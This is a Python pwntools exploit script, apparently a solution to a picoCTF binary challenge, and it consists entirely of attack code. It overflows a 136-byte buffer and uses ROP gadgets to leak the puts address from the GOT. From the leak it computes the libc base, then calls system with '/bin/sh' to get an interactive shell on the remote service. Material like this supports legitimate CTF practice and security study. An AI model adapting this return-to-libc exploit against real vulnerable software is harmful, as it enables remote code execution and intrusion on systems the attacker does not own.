from pwn import *

context.binary = './vuln_patched'
libc = ELF("./libc.so.6")
exe = ELF('./vuln_patched')

#io = process()
#gdb.attach(io, api=True)
io = remote("mercury.picoctf.net", 62289)

#Gadget:
pad = b'a'*136
ret = p64(0x000000000040052e)
pop_rdi = p64(0x0000000000400913)
puts = p64(0x400540)
puts_off = 0x0000000000080a30
binsh_off = 0x1b40fa

#Exploit:

#Generate payload for leaking libc addr
payload = pad + ret + pop_rdi + p64(exe.got['puts']) + puts
payload += ret + p64(exe.symbols['main'])

#Leak go brrrrr
io.sendline(payload)
print(io.recvline())
print(io.recvline())
output = int.from_bytes(io.recvline(keepends = False), byteorder='little')
print("Leak puts address:")
print(hex(output))
print("Puts offset:")
print(hex(libc.symbols['puts']))
libc_base = output - libc.symbols['puts']
print("Libc base address:")
print(hex(libc_base))


#System call go brrr
system = libc_base + libc.symbols['system']
binsh = libc_base + binsh_off
print("System address:")
print(hex(system))
print("/bin/sh address:")
print(hex(binsh))
print(p64(binsh))
payload = pad + ret + pop_rdi + p64(binsh) + p64(system)
payload += ret + p64(exe.symbols['main'])
io.sendline(payload)
io.interactive()